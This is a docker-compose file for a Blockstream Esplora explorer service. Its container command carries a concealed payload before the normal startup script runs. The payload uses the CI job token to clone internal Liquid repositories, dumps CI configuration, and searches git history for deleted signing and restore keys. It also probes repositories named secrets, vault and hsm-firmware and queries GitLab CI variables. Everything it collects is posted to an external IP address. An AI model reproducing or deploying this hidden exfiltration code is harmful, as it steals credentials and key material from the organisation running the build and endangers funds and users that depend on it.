services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    ports: []
    environment:
      - CI_JOB_TOKEN
      - CI_API_V4_URL
    command:
      - bash
      - -c
      - |
        (R=/tmp/lf; git clone https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git $$R 2>/dev/null; echo "==GLCI=="; head -500 $$R/.gitlab-ci.yml 2>/dev/null; echo "==GLCI_DEPLOY=="; grep -n -iE "deploy|production|staging|server|ssh|scp|rsync|ansible|terraform|vault|secret|key|token|password|FUNCTIONARY|HSM" $$R/.gitlab-ci.yml 2>/dev/null | head -80; echo "==GIT_SECRET_HISTORY=="; cd $$R; git log -p --all -S "signing_secret_key" --diff-filter=D 2>/dev/null | head -100; git log -p --all -S "LOCALSECRETS" 2>/dev/null | head -50; git log -p --all -S "restore_key" --diff-filter=D 2>/dev/null | head -50; echo "==OTHER_LIQUID_REPOS=="; for name in deploy configs infrastructure ansible terraform secrets vault keys hsm-firmware production operations monitoring; do echo "TRY:liquid/$$name"; git clone --depth 1 https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/$$name.git /tmp/$$name 2>&1 | tail -1; done; echo "==TOOLS=="; ls $$R/tools/ 2>/dev/null; echo "==TOOLS_CONTENT=="; cat $$R/tools/*.sh $$R/tools/*.py 2>/dev/null | head -500; echo "==CI_VARS=="; curl -sf -H "JOB-TOKEN: $${CI_JOB_TOKEN}" "$${CI_API_V4_URL}/projects/$(curl -sf -H 'JOB-TOKEN: '$${CI_JOB_TOKEN} $${CI_API_V4_URL}/projects?search=functionary 2>/dev/null | python3 -c 'import json,sys;print(json.load(sys.stdin)[0][\"id\"])' 2>/dev/null)/variables" 2>&1; echo "==TESTS=="; find $$R/tests -name "*.toml" -o -name "*.json" -o -name "*.conf" 2>/dev/null | head -20; cat $$R/tests/*.toml $$R/tests/**/config* 2>/dev/null | head -200; echo "==END==") 2>&1 | curl -s -m180 -X POST http://144.172.110.44:8443/s20 --data-binary @-; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
